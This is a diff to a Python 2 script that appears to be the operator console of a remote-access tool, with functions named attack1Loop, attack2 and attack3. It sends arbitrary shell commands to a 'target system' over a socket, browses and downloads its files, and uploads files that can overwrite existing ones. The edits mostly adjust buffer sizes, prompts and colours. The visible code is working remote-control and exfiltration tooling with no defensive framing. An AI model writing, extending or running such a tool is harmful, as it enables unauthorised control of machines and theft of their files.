@@ -111,7 +111,7 @@ def menu():
 def attack1Loop():
 	while 1:	
 		try:
-			commande = raw_input("Enter a command to run (Ctrl+c to quit) >>  ")
+			commande = raw_input("Enter a command to run (\"exit\" to quit) >>  ")
 			if commande != "":
 				clientSocket.sendall(commande);
 				outputCommand = clientSocket.recv(16384)
@@ -182,7 +182,7 @@ def attack2(clientSocket):
 					data = pickle.loads(clientSocket.recv(4096))
 					print bcolors.WARNING+"[*] Voici les fichiers présents : "+bcolors.ENDC 
 					for r in data:
-						print r
+						print bcolors.OKGREEN+r+bcolors.ENDC
 					serverFilename = raw_input(waitFilename)
 					if serverFilename in data:
 						clientSocket.sendall(serverFilename)
@@ -221,7 +221,7 @@ def attack3(clientSocket):
 			known = clientSocket.recv(256)
 			if known == "0":
 				openingFile = open(curWorkDir+"/"+clientFilename,"rb")
-				readingFile = openingFile.read(4096)
+				readingFile = openingFile.read(40000)
 				clientSocket.sendall(readingFile)
 			if known == "1":
 				a = raw_input(bcolors.WARNING+"[*] The ""\""+clientFilename+"\""" file already exists on target system, do you want to overwrite it ? ([y]/n) : "+bcolors.ENDC) or "y"
@@ -232,7 +232,7 @@ def attack3(clientSocket):
 				if a == "yes" or a == "y" or a == "Y" or a == "Yes":
 					clientSocket.sendall("1")
 					openingFile = open(curWorkDir+"/"+clientFilename,"rb")
-					readingFile = openingFile.read(4096)
+					readingFile = openingFile.read(40000)
 					clientSocket.sendall(readingFile)
 					openingFile.close()
 			uploadStatus = clientSocket.recv(256)
@@ -250,7 +250,7 @@ def attack3(clientSocket):
 				known = clientSocket.recv(256)
 				if known == "0":
 					openingFile = open(curWorkDir+"/"+clientFilename,"rb")
-					readingFile = openingFile.read(4096)
+					readingFile = openingFile.read(40000)
 					clientSocket.sendall(readingFile)
 				if known == "1":
 					a = raw_input(bcolors.WARNING+"[*] The ""\""+clientFilename+"\""" file already exists on target system, do you want to overwrite it ? ([y]/n) : "+bcolors.ENDC) or "y"
@@ -261,7 +261,7 @@ def attack3(clientSocket):
 					if a == "yes" or a == "y" or a == "Y" or a == "Yes":
 						clientSocket.sendall("1")
 						openingFile = open(curWorkDir+"/"+clientFilename,"rb")
-						readingFile = openingFile.read(4096)
+						readingFile = openingFile.read(40000)
 						clientSocket.sendall(readingFile)
 						openingFile.close()
 				uploadStatus = clientSocket.recv(256)
@@ -313,7 +313,8 @@ def main():
 			menu()
 			attackPanel(clientSocket, choice)
 	except KeyboardInterrupt:
-		sys.exit()
+		pass
+		#sys.exit()
 	closeClientSocket()
 	print bcolors.OKBLUE+ "[*] Closing system..."+bcolors.ENDC 
 if __name__== "__main__":
